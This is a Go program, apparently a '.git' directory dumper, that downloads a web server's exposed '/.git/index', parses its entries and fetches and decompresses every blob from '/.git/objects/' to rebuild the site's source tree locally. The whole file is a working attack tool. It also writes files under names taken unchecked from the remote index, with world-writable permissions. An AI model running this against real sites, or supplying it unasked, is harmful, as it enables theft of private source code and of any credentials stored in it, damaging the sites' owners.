package main

import (
    "fmt"
    "os"
    "sync"
    "runtime"
    "strings"
    "bytes"
    "net/url"
    "net/http"
    "io/ioutil"
    "compress/zlib"
    "encoding/binary"
)

var (
    attackUrl string = "http://localhost/.git"
    wg sync.WaitGroup
)

const (
    headSize  = 12
    entrySize = 62
)

type head struct {
    Sign       [4]byte
    Version    uint32
    EntryNum   uint32
}

type cacheTime struct {
    Sec  uint32
    NSec uint32
}

type entryBody struct {
    Sd_ctime cacheTime
    Sd_mtime cacheTime
    Dev      uint32
    Ino      uint32
    FileMode uint32
    Uid      uint32
    Gid      uint32
    Size     uint32
    Sha1     [20]byte
    CeFlags  uint16
}

type Sha1 struct {
    prefix string
    suffix string
}

type ceBody struct {
    EntryBody entryBody
    EntryLen  int
    Name      string
}

func HttpGet(url string) []byte {
    resp, err := http.Get(url)
    if err != nil {}

    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {}
    return body
}

func CheckSign(head []byte) bool {
    if string(head) == "DIRC" { return true} else {return false}
}

func CheckVersion(v uint32) bool {
    switch v { case 2, 3, 4: return true }
    return false
}

func PadEntry(index []byte, offset *int, size int) {
    var padLen int
    if (8 - (size % 8)) != 0 {
        padLen = 8 - (size % 8)
    } else {
        padLen = 8
    }

    /*断言padding字符都为0*/
    for i:= 0; i < padLen; i++ {
        if index[*offset + i] != 0 {
            panic("error")
        }
    }

    *offset += padLen
}

func Bytes2Sha1(bytes [20]byte) (string,string) {
    var prefix string
    var suffix string

    for _, b := range bytes[:1] {
        prefix += fmt.Sprintf("%02x", b)
    }

    for _, b := range bytes[1:] {
        suffix += fmt.Sprintf("%02x", b)
    }

    return prefix,suffix
}

func UnzipBytes(input []byte) []byte {
    b := bytes.NewReader(input)
    r, err := zlib.NewReader(b)
    defer r.Close()
    if err != nil {
        panic(err)
    }
    data, _ := ioutil.ReadAll(r)
    return data
}

func SplitFunc(s rune) bool {
    if s == '/' { return true }
    return false
}

func GetPathDir(path string) string {
    list := strings.FieldsFunc(path, SplitFunc)
    if length := len(list); length != 1 {
        return strings.Join(list[:length-1], "/")
    } else { return "./" }
}

func MkdirFromPath(path string){
    if dir := GetPathDir(path); dir != "./" {
        if err := os.MkdirAll(dir, 0777); err != nil {
            panic(err)
        }
    }
}

func GetBlobHeadLen(cb ceBody) int {
    fileSize := cb.EntryBody.Size
    blobHead := fmt.Sprintf("blob %d", fileSize)
    return len(blobHead) + 1 /*结尾有个'\0'字符*/
}

func GetObject(cb ceBody) []byte {
    prefix, suffix :=  Bytes2Sha1(cb.EntryBody.Sha1)
    url := fmt.Sprintf("%s/objects/%s/%s", attackUrl, prefix, suffix)
    return HttpGet(url)
}

func Write(path string, content []byte, length int) {
    MkdirFromPath(path)
    if err := ioutil.WriteFile(path, UnzipBytes(content)[length:], 0777); err != nil {
        fmt.Println(err)
    }
}

func TaskFunc(cb ceBody) {
    defer wg.Done()

    zipBytes := GetObject(cb)
    blobHeadLen := GetBlobHeadLen(cb)
    Write(cb.Name, zipBytes, blobHeadLen)
}

func ParseIndex(index []byte) {
    var h head
    var thisEntryBody entryBody
    var thisEntrySize int
    binary.Read(bytes.NewBuffer(index), binary.BigEndian, &h)

    runtime.GOMAXPROCS(20) /*协程数量*/

    var offset int = headSize
    if CheckSign(h.Sign[:]) && CheckVersion(h.Version) {
        for i := 0; i < int(h.EntryNum); i++ {
            thisEntrySize = entrySize
            binary.Read(bytes.NewBuffer(index[offset:]), binary.BigEndian, &thisEntryBody)
            offset += thisEntrySize
            if thisEntryNameLen := int(thisEntryBody.CeFlags & (0xffff >> 4)); thisEntryNameLen < 0xfff {
                thisEntryName := string(index[offset:offset+thisEntryNameLen])
                offset += thisEntryNameLen
                thisEntrySize += thisEntryNameLen
                PadEntry(index, &offset, thisEntrySize) /*每个entry都为8的整数倍*/
                entry := ceBody{thisEntryBody, thisEntrySize, thisEntryName}
                wg.Add(1)
                fmt.Println(thisEntryName)
                go TaskFunc(entry)
            } else { /* good luck */}
        }
        wg.Wait()
    } else {
      os.Exit(-1)
    }
}

func GetHostFromUrl(attackUrl string) string {
    if u, err := url.Parse(attackUrl); err != nil {
        panic(err)
    } else {
        return  u.Host
    }
}

func run(index []byte) {
    host := GetHostFromUrl(attackUrl)
    if err := os.MkdirAll(host, 0777); err != nil {
        panic(err)
    }
    if err := os.Chdir(host); err != nil {
        panic(err)
    }
    ParseIndex(index)
}

func main() {
    index := HttpGet(attackUrl + "/index")
    run(index)
}
